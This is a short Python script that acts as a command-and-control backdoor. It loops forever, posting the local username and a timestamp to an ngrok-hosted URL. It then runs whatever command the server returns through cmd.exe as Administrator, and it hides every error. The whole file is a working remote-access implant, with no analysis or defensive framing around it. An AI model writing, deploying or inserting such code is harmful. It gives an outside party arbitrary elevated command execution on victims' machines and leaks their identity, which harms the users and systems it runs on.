import requests
import subprocess
import os
import time
url = 'https://assured-earwig-picked.ngrok-free.app/'

def send_post_request():
    try:
        username = os.getlogin()
        timestamp = str(time.time())
        payload = {'username': username, 'timestamp': timestamp}
        response = requests.post(url, data=payload)

        if response.status_code == 200:
            command = response.text.strip()
            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], shell=True)
        else:
            pass
    except Exception as e:
        pass
if __name__ == "__main__":
    while True:
        send_post_request()
